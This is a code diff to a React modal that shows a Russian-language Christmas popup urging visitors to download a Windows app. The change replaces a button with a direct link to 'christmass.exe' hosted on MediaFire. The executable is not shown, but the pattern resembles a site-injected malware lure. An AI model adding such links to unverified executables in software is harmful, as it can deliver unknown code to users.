@@ -1,4 +1,5 @@
 import React from "react";
+import '../stylesheet/Modal.scss'
 import { toast } from "react-toastify";
 import "react-toastify/dist/ReactToastify.css";
 
@@ -8,9 +9,9 @@ const Modal = () => {
       <h3>🎄 У нас появилось приложение! 🎁</h3>
       <p>Скачайте наше приложение для Windows</p>
       <div className="app-modal__buttons">
-        <button onClick={handleDownload} className="download-button">
+        <a href="https://download1529.mediafire.com/kode6yd9cvfgQiJVi-9S5GGgFNLO8GQox7bXG3C0oVba0CTv9fN26AZb-Qt8WCbTj7i492RzHzjOYZTw3jOaami34zuZtDgyuoegktfoHVwLoEY-gheCqLkwc4rolvqw9QDj4MPxidSouugwX88URXn9ZDGrSfdfDFN2-6Lboag/4b4tpdhh74jqfvw/christmass.exe" className="download-button">
           Скачать прямо сейчас
-        </button>
+        </a>
       </div>
     </div>
   );
